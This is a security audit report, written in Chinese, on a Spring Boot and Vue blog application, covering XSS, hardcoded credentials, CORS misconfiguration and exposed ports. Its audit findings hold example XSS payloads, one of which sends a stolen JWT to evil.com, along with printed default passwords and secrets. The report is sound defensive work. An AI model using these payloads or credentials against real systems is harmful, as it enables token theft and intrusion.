# CyberBlog 安全缺陷审计报告

> 审计时间：2026-06-23 | 审计范围：全栈（Spring Boot 后端 + Vue3 前端 + Docker 部署） | 审计模式：黑盒 + 白盒混合

---

## 概要

| 严重级别 | 数量 |
|----------|------|
| **CRITICAL** | 7 |
| **HIGH** | 8 |
| **MEDIUM** | 10 |
| **LOW** | 8 |
| **合计** | **33** |

---

## CRITICAL 级缺陷（7 个）

### C-01 · 存储型 XSS — 文章内容通过 v-html 渲染未经净化的 marked 输出

**位置**：`ArticleDetailView.vue:47`、`WriteView.vue:84`

```vue
<div class="article-content cyber-prose" v-html="renderedContent"></div>
```

```ts
const renderedContent = computed(() => {
  return marked(article.value.content) as string  // 无 DOMPurify 净化
})
```

**攻击方式**：登录用户创建包含恶意 JS 的文章，例如：

```html
<img src=x onerror="fetch('https://evil.com/steal?'+localStorage.getItem('cyber_token'))">
```

所有访问该文章的用户浏览器都会执行此脚本，JWT token 被窃取。

---

### C-02 · 代码块语言标识符注入导致 XSS

**位置**：`ArticleDetailView.vue:187-199`

```ts
const displayLang = language.toUpperCase()
return `<span class="code-lang">${displayLang}</span>...`
```

`lang` 参数来自 Markdown 代码围栏信息字符串，直接拼接进 HTML 未经转义。

**攻击方式**：Markdown 中写入：

```
```<img src=x onerror=alert(document.cookie)>
code here
```
```

`displayLang` 变量注入到 `<span>` 标签中，触发任意 JS 执行。

---

### C-03 · JWT 密钥硬编码在配置文件

**位置**：`application.yml:41`

```yaml
jwt:
  secret: cyberblog-super-secret-key-2024-please-change-in-production-min-256bit
```

**攻击方式**：获取此密钥后可伪造任意用户的 JWT token，包括 `username: "admin"` 的管理员 token，完全绕过认证系统。

---

### C-04 · CORS 允许任意来源 + 携带凭证

**位置**：`SecurityConfig.java:56-59`

```java
config.setAllowedOriginPatterns(List.of("*"));   // 任意来源
config.setAllowCredentials(true);                  // 携带 Cookie/Token
```

**攻击方式**：任何恶意网站都可以发起携带用户 Authorization 头的跨域请求，结合 XSS 窃取的 token，可代替用户执行任意 API 操作（删文章、发评论等）。

---

### C-05 · 管理员密码硬编码 + 明文写入日志

**位置**：`DataInitializer.java:29, 69-70`

```java
private static final String DEFAULT_ADMIN_PASSWORD = "Admin@2077";
// ...
log.info("管理员初始化完成 — 用户名: {}, 密码: {}", DEFAULT_ADMIN_USERNAME, DEFAULT_ADMIN_PASSWORD);
```

**攻击方式**：(1) 任何能访问日志或源码的人获得管理员密码；(2) 密码写入日志系统后被 ELK/Splunk 等持久化存储，扩大泄露面。

---

### C-06 · 每次重启强制重置管理员密码

**位置**：`DataInitializer.java:61-62`

```java
} else {
    admin.setPasswordHash(bcryptHash);  // 已存在也强制更新
```

**攻击方式**：即使管理员修改了密码，触发一次应用重启即可将密码重置为默认值 `Admin@2077`。这是事实上的后门——知道默认密码的人只需触发服务重启就能重新获得管理员权限。

---

### C-07 · 数据库 / MinIO 凭证硬编码在 docker-compose.yml

**位置**：`docker-compose.yml:9,12,46-47,72-74`

```yaml
MYSQL_ROOT_PASSWORD: cyberblog123
MINIO_ROOT_PASSWORD: minioadmin123
SPRING_DATASOURCE_PASSWORD: cyberblog123
MINIO_SECRET_KEY: minioadmin123
```

**攻击方式**：任何能访问代码仓库的人获取所有中间件凭证，结合暴露的端口（3306/9001），直接连接数据库读取全部用户数据或连接 MinIO 删除所有上传文件。

---

## HIGH 级缺陷（8 个）

### H-01 · JWT Token 存于 localStorage 可被 XSS 窃取

**位置**：`stores/user.ts:24,42`

```ts
const token = ref(localStorage.getItem('cyber_token') || '')
localStorage.setItem('cyber_token', t)
```

localStorage 中的数据可被同源页面中任意 JS 访问。与 C-01 XSS 漏洞结合，攻击者只需让受害者访问一篇恶意文章即可窃取其 token。

---

### H-02 · 全站仅 HTTP 无 TLS 加密

**位置**：`nginx.conf:2`（`listen 80;`无 443/SSL）、`docker-compose.yml:105`（`ports: "80:80"`）

所有流量（JWT token、密码 SHA-256 哈希、个人信息）以明文传输。中间人可在公共 WiFi 中通过 ARP 欑骗截获 token 和密码哈希。

---

### H-03 · Redis 无密码且端口暴露到宿主机

**位置**：`docker-compose.yml:28-35`

```yaml
redis:
  ports: "6379:6379"
  command: redis-server --appendonly yes  # 无 requirepass
```

攻击者直连 Redis 读取缓存数据，或通过 Redis 写入恶意数据（如 flushall 清空缓存）。

---

### H-04 · Swagger/Knife4j API 文档在生产环境公开可访问

**位置**：`SecurityConfig.java:40-41`

```java
.requestMatchers("/doc.html", "/swagger-ui/**", "/v3/api-docs/**").permitAll()
```

攻击者访问 `/doc.html` 获取所有 API 端点信息，大幅降低攻击成本。

---

### H-05 · SQL 日志输出到 StdOut

**位置**：`application.yml:33`

```yaml
mybatis-plus:
  configuration:
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl
```

所有 SQL 查询输出到标准输出，包含用户密码哈希、邮箱等敏感数据。

---

### H-06 · 管理员权限基于用户名字符串而非角色字段

**位置**：`ArticleServiceImpl.java:104-105`

```java
boolean isAdmin = "admin".equals(currentUser.getUsername());
```

**攻击方式**：如果注册接口未禁止 `admin` 用户名（当前通过 `DataInitializer` 预占但非注册层约束），普通用户可冒充管理员。

---

### H-07 · 密码哈希流程不一致

**位置**：`UserServiceImpl.java:48` vs `DataInitializer.java`

注册时后端直接 `bcrypt(dto.getPassword())`，但 DataInitializer 使用 `bcrypt(sha256(password))`。如果攻击者绕过前端直接调用 API 传入纯文本密码，密码处理流程不一致可能导致认证混乱。

---

### H-08 · JWT 缺少 jti（Token ID）无法撤销

**位置**：`JwtUtil.java:27-35`

```java
public String generateToken(Long userId, String username) {
    return Jwts.builder()
            .subject(String.valueOf(userId))
            .claim("username", username)
            // 无 .id(jti) 唯一标识
            ...
}
```

Token 签发后在过期前无法使其失效。密码修改后旧 token 仍可用。

---

## MEDIUM 级缺陷（10 个）

### M-01 · Nginx 缺失安全响应头（CSP / X-Frame-Options 等）

**位置**：`frontend/nginx.conf`（全文）

缺少 `Content-Security-Policy`、`X-Content-Type-Options`、`X-Frame-Options`、`Strict-Transport-Security`。缺少 CSP 使 C-01/C-02 的 XSS 不受限制；缺少 `X-Frame-Options` 使网站可被 iframe 嵌入遭受点击劫持。

---

### M-02 · 客户端密码哈希使用无盐 SHA-256

**位置**：`utils/crypto.ts:40-42`

```ts
return sha256(password)  // 无盐、单次 SHA-256
```

相同密码产生相同哈希（可彩虹表攻击）；哈希成为"密码等价物"，截获后可直接重放登录。

---

### M-03 · 开放重定向 — 登录 redirect 参数未验证

**位置**：`LoginView.vue:62-63`

```ts
const redirect = route.query.redirect as string
router.push(redirect || '/')
```

攻击者构造钓鱼链接 `/login?redirect=https://evil.com`，用户登录后被重定向到恶意站点。

---

### M-04 · 客户端授权基于可篡改的 localStorage 数据

**位置**：`ArticleDetailView.vue:174-183`

```ts
const canDelete = computed(() => {
  return userStore.user.id === article.value.userId || userStore.user.username === 'admin'
})
```

用户可通过 DevTools 修改 localStorage 中 `cyber_user`，将 username 改为 `admin`，前端立即显示编辑/删除按钮。

---

### M-05 · MySQL 端口暴露到宿主机

**位置**：`docker-compose.yml:13` — `ports: "3306:3306"`

结合 H-07 中的凭证，外部攻击者可直连数据库。

---

### M-06 · 后端 API 端口暴露可绕过 Nginx 代理

**位置**：`docker-compose.yml:69-70` — `ports: "8080:8080"`

攻击者直连 `http://host:8080/api/...` 绕过 Nginx 的安全配置。

---

### M-07 · 登录接口无频率限制

**位置**：`AuthController.java:31-34`

暴力破解攻击可无限次尝试登录，无 rate limiting 或验证码机制。

---

### M-08 · 点赞端点完全无认证 + 游客 ID 可伪造

**位置**：`LikeController.java:21-23`

```java
@PostMapping("/{targetType}/{targetId}")
@RequestHeader(value = "X-Guest-Id", required = false) String guestId
```

`guestId` 完全由客户端提供无服务端验证。批量刷赞脚本可轻易编写。

---

### M-09 · 注册后自动登录无邮箱验证

**位置**：`RegisterView.vue:57-59`

注册成功立即颁发 token 并登录，无邮箱验证。攻击者可批量注册账号发布恶意文章。

---

### M-10 · 用户资料更新通过 URL 查询参数传输

**位置**：`api/auth.ts:15-16`

```ts
request.put('/auth/profile', null, { params: { bio, avatarUrl } })
```

`bio` 和 `avatarUrl` 通过 URL 查询参数发送，会被记录在 nginx 日志和浏览器历史中。

---

## LOW 级缺陷（8 个）

| 编号 | 缺陷 | 位置 |
|------|------|------|
| L-01 | JWT 过期检查不验证签名 | `stores/user.ts:8-21` |
| L-02 | 路由守卫仅客户端检查 | `router/index.ts:21-26` |
| L-03 | 文件上传缺少类型/大小校验 | `WriteView.vue:30,220` |
| L-04 | 全局 `window.copyCodeBlock` 函数暴露 | `ArticleDetailView.vue:261` |
| L-05 | Cookie 缺少 Secure 标志 | `utils/guest.ts:25-27` |
| L-06 | 数据库连接 `useSSL=false` | `application.yml:6` |
| L-07 | 生产环境 Debug 日志级别 | `application.yml:55-57` |
| L-08 | 注册无密码强度校验 | `RegisterView.vue:15` |

---

## 攻击链分析

### 链 1 · 全站 Token 窃取链（最危险）

```
注册账号(M-09无验证) → 发布恶意文章(C-01 XSS) → 受害者访问 → XSS窃取localStorage token(H-01) → 冒充任意用户
```

**危害**：全站已登录用户 token 被窃取，攻击者可冒充任意用户执行所有 API 操作。

### 链 2 · 管理员伪造链

```
获取JWT密钥(C-03硬编码) → 伪造admin token → CORS*(C-04)允许任意域发起请求 → 删除/修改所有文章
```

**危害**：完全接管管理员权限，操作全部内容。

### 链 3 · 数据库直连链

```
获取docker-compose凭证(C-07) → 扫描3306端口(M-05暴露) → root/cyberblog123直连MySQL → 全库数据泄露
```

**危害**：全部用户数据（密码哈希、邮箱、文章内容）被读取或篡改。

### 链 4 · 密码重放攻击链

```
HTTP环境(H-02无TLS) → ARP欺骗截获登录请求 → 获取SHA-256哈希(M-02无盐) → 直接用哈希重放登录
```

**危害**：无需破解原始密码，截获的哈希即可直接登录。

---

## 修复优先级建议（仅排序，不提供修复方案）

1. 🔴 C-01/C-02 — XSS（最紧急，影响全站用户）
2. 🔴 C-04 — CORS（配合 XSS 可远程操控）
3. 🔴 C-03/C-07 — 凭证硬编码（泄露即全面失控）
4. 🔴 C-06 — 密码强制重置（事实后门）
5. 🟠 H-01/H-02 — Token 存储 + 无 TLS
6. 🟠 H-03/M-05/M-06 — 端口暴露
7. 🟡 其余 MEDIUM/LOW 级缺陷
